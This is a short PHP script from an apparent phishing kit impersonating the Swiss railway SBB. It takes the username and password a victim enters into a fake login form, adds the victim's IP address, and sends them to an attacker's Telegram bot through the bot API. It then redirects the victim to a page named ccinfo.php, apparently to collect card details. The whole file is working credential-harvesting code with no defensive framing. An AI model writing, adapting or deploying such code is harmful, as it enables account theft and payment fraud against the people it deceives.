<?php

include'config.php';

$user = $_POST['USERNAME'] ; 
$pass = $_POST['PASSWORD'] ; 
$ip = $_SERVER['REMOTE_ADDR'];
 

$message  = "------------------+ 🇨🇭 SBB 🇨🇭 +-----------------\r\n";
$message .= "EMAIL : ".$user."\r\n";
$message .= "PASS : ".$pass."\r\n";
$message .= "---------------+ Host Infos +---------------\r\n";
$message .= "IP Address : ".$ip."\r\n";
$message .= "-----------------+ 🇨🇭 LOGIN 🇨🇭 +------------------\r\n";



 	$website="https://api.telegram.org/bot" . $api;
    $params=[
        'chat_id' => $chat,
        'text'=>$message,
    ];
    $ch = curl_init($website . '/sendMessage');
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch); 


   $x=md5(microtime());$xx=sha1(microtime());


echo "<script> window.top.location.href = 'ccinfo.php';   </script>";

?>